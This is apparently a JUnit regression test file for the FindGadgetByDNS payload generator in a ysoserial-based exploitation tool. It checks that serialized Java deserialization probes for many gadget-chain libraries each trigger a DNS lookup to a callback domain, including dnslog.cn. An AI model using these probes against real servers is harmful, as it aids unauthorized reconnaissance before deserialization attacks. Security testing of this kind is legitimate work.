package com.bloom.payload;

import com.bloom.exploit.payload;
import com.unboundid.util.Base64;
import org.junit.Test;
import ysoserial.Serializer;
import ysoserial.payloads.FindGadgetByDNS;

import java.net.URL;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

/**
 * FindGadgetByDNS 批量探测回归测试：
 * mvel 回归、探针数量、对照组齐全、随机前缀去重、整体可序列化。
 */
public class FindGadgetByDNSTest {

    private static List<Object> generate(String domain) throws Exception {
        Object result = new FindGadgetByDNS().getObject(domain);
        assertTrue("getObject 应返回 List", result instanceof List);
        return (List<Object>) result;
    }

    private static Set<String> hostsOf(List<Object> probes) {
        Set<String> hosts = new HashSet<String>();
        for (Object probe : probes) {
            HashMap map = (HashMap) probe;
            URL url = (URL) map.keySet().iterator().next();
            hosts.add(url.getHost());
        }
        return hosts;
    }

    @Test
    public void mvelProbeRestored() throws Exception {
        List<Object> probes = generate("example.com");
        byte[] data = Serializer.serialize(probes);
        String blob = new String(data, "ISO-8859-1");
        assertTrue("mvel 标记类应出现在序列化结果中",
                blob.contains("org.mvel2.sh.ShellSession"));
        assertTrue("mvel marker 应在探针列表中", hasMarker(hostsOf(probes), "mvel"));
    }

    @Test
    public void probeCountAndKeyMarkers() throws Exception {
        List<Object> probes = generate("example.com");
        assertTrue("探针数量应不少于 35，实际 " + probes.size(), probes.size() >= 35);

        Set<String> hosts = hostsOf(probes);
        for (String marker : new String[]{
                "cc31or321", "cb19x", "el", "jel", "mvel", "cb1", "hibernate",
                "json1", "fileupload1", "rome", "rhino1", "clojure",
                "h2", "druid", "tomcatjdbc", "tdbcp1", "tdbcp2", "cdbcp1", "cdbcp2",
                "jdk8", "ctrlp", "ctrln"}) {
            assertTrue("缺少 marker: " + marker, hasMarker(hosts, marker));
        }
    }

    @Test
    public void serializableAndKeyClassesPresent() throws Exception {
        byte[] data = Serializer.serialize(generate("example.com"));
        String blob = new String(data, "ISO-8859-1");
        for (String clazz : new String[]{
                "jakarta.el.ELProcessor",
                "java.lang.Object",
                "com.bloom.probe.NegativeControl",
                "org.mvel2.sh.ShellSession"}) {
            assertTrue("序列化结果应包含标记类 " + clazz, blob.contains(clazz));
        }
    }

    @Test
    public void runIdDiffersAcrossCalls() throws Exception {
        Set<String> first = hostsOf(generate("example.com"));
        Set<String> second = hostsOf(generate("example.com"));

        String runId1 = runIdOf(first);
        String runId2 = runIdOf(second);
        assertEquals(6, runId1.length());
        assertEquals(6, runId2.length());
        assertTrue("同一域名两次生成的随机前缀应不同", !runId1.equals(runId2));
        for (String host : first) {
            assertTrue("host 应以用户域名结尾: " + host, host.endsWith(".example.com"));
        }
    }

    @Test
    public void generationNeverThrowsOnCurrentJdk() throws Exception {
        // JDK 版本组标记在低版本工具机上生成失败时应被跳过而不是整体抛异常
        assertTrue(generate("example.com").size() >= 35);
    }

    @Test
    public void endToEndThroughPayloadDispatch() throws Exception {
        // 走工具真实分发入口 choiceTypeByswitch -> getPayload，验证可生成合法序列化流
        String b64 = payload.getPayload("FindGadgetByDNS", "test.dnslog.cn");
        byte[] ser = Base64.decode(b64);
        assertTrue("输出应为 Java 序列化流", ser.length > 4
                && (ser[0] & 0xFF) == 0xAC && (ser[1] & 0xFF) == 0xED);
    }

    private static boolean hasMarker(Set<String> hosts, String marker) {
        for (String host : hosts) {
            if (host.startsWith(marker + ".")) {
                return true;
            }
        }
        return false;
    }

    /** host 形如 {marker}.{runId}.{domain}，取第二段作为 runId。 */
    private static String runIdOf(Set<String> hosts) {
        String host = hosts.iterator().next();
        return host.split("\\.")[1];
    }
}
